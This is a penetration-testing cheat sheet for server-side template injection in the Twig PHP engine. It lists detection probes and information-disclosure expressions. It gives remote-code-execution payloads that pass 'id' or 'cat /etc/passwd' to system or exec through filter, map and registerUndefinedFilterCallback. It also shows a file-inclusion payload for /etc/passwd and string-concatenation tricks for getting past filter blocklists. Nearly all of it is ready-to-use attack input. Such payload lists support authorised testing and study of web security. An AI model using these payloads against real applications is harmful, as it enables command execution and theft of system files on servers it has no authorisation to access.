# SSTI - Twig (PHP)

## Detection
```
{{7*7}}          → 49
{{7*'7'}}        → 49
${7*7}           → Not evaluated (not Twig syntax)
{{7*7}}[[5*5]]   → Test alternate delimiters
```

## Basic Info Disclosure
```
{{_self}}
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

## RCE Payloads

### Via Filter Abuse (Twig < 1.24, < 1.20 older versions)
```
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
```

### Via _self.env.registerUndefinedFilterCallback (older Twig)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Via _self.env.getFilter (older Twig)
```
{% set foo = "id" %}
{{ _self.env.getFilter(foo) }}
```

## Modern Twig (Sandboxed)
```
# If sandbox extension enabled, attribute access to system objects is restricted
# Check for sandbox bypass in specific Twig version CVEs
```

## Symfony-Specific (uses Twig)
```
{{app.request.query.filter('id')}}
{{app.request.server.get('SERVER_SOFTWARE')}}

# CVE-2019-10914 or similar version-specific bypasses may apply
```

## Blind SSTI Detection
```
{{7*7}}"+"        # If math result appears in unexpected place
{% for i in 1..10 %}{{i}}{% endfor %}   # Loop execution test
```

## Useful Twig Functions/Filters for Recon
```
{{_self}}                    # Current template
{{_context}}                 # Available variables
{{dump()}}                   # Debug dump (if debug extension enabled)
{{include('/etc/passwd')}}   # File inclusion (path traversal)
```

## Filter Bypass
```
{{['id']|filter('sy'~'stem')}}      # String concatenation to bypass filter blocklist
{{['id']|filter(['system'][0])}}
```
